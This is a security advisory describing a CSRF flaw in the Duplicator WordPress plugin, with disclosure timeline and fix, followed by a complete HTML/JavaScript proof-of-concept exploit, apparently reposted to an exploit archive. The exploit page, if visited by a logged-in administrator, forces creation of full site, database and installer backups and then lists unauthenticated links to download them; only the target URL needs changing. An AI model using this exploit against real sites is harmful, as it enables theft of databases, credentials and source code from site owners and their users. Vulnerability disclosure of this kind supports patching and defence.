Duplicator Wordpress Plugin Code And Database Dump Via CSRF Vulnerability
-----------------------------------------------------------------------------------------------
 
Product: Duplicator WordPress Plugin
Vendor: Life In The Grid
Tested Versions: 1.1.0, 1.2.0
Other Vulnerable Versions: Prior versions may also be affected
CVE Reference: Pending
Risk Level: High
CVSSv3 Base Score: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N
 
-----------------------------------------------------------------------------------------------
 
RatioSec Research has discovered a cross-site request forgery
vulnerability in Duplicator WordPress Plugin which can be exploited to
generate and disclose the WordPress database and code backups.
 
The application allows users to perform certain actions via HTTP
requests without performing proper checks to verify the requests
validity. An authenticated user's browser can be forced to generate
and disclose the WordPress database and code backups via the
vulnerable backup function by tricking the user into visiting a
malicious web site.
 
-----------------------------------------------------------------------------------------------
 
Proof of Concept
 
The proof of concept HTML page, if visited by a logged-in
administrative user, raises two requests
(`/wp-admin/admin.php?page=duplicator&tab=new2` and
`/wp-admin/admin-ajax.php?action=duplicator_package_build`) forcing
the creation of the WordPress source code, database, and install
scripts backup in the paths
`/wp-snapshots/ratiosec_ratiosec_archive.zip`,
`/wp-snapshots/ratiosec_ratiosec_database.sql`, and
`/wp-snapshots/ratiosec_ratiosec_installer.php`. Once generated, the
backup archives can be downloaded by the attacker with no
authentication.
 
See the proof of concept code on the RatioSec Research website.
http://www.ratiosec.com/2016/duplicator-wordpress-plugin-source-database-disclosure-via-csrf/
 
-----------------------------------------------------------------------------------------------
 
Solution
 
Update to version 1.1.4.
 
-----------------------------------------------------------------------------------------------
 
Timeline
 
- First contact: 29th January, 2016
- Disclosure: 29th January, 2016. Preliminary date set to 19th, February 2016.
- Postponed: Date pushed back to 19th February, 2016
- Fixed in GIT: 6th February, 2016
- Fixed Release: 9th February, 2016
- Advisory Publication: 9th February, 2016
 
-----------------------------------------------------------------------------------------------
 
Advisory URL
 
http://www.ratiosec.com/2016/duplicator-wordpress-plugin-source-database-disclosure-via-csrf/
 
RatioSec Research
 
Mail: research at ratiosec dot com
Web: http://www.ratiosec.com/
Twitter: https://twitter.com/ratio_sec
 
 
 
 
==============
POC:
 
<html>
  <body>
    <script>
 
      wordpress_root = "http://localhost/wordpress";
 
      function submitRequest1()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", wordpress_root + "/wp-admin/admin.php?page=duplicator&tab=new2", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-GB,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.withCredentials = true;
        var body = "action=&package-hash=ratiosec&package-name=ratiosec&package-notes=&archive-format=ZIP&filter-dirs=&filter-exts=&dbhost=&dbport=&dbname=&dbuser=&url-new=";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      }
      function submitRequest2()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", wordpress_root + "/wp-admin/admin-ajax.php?action=duplicator_package_build", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-GB,en;q=0.5");
        xhr.withCredentials = true;
        var body = "";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      }
      function printLinks()
      {
 
    var dumps = ["ratiosec_ratiosec_archive.zip", "ratiosec_ratiosec_database.sql", "ratiosec_ratiosec_installer.php"];
    for(var a in dumps) {
        var url = wordpress_root + '/wp-snapshots/' + dumps[a];
        document.body.innerHTML += '<br/><a href="' + url +  '">' + url + '</a>';
    };
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest1();setTimeout(submitRequest2,2000);setTimeout(printLinks,2500);" />
    </form>
    <p>Submit the CSRF request and wait few seconds to see below the public links of the dumps.</p>
  </body>
</html>
 
#  DediGalihWisnumurti Team [2016-02-16]  #
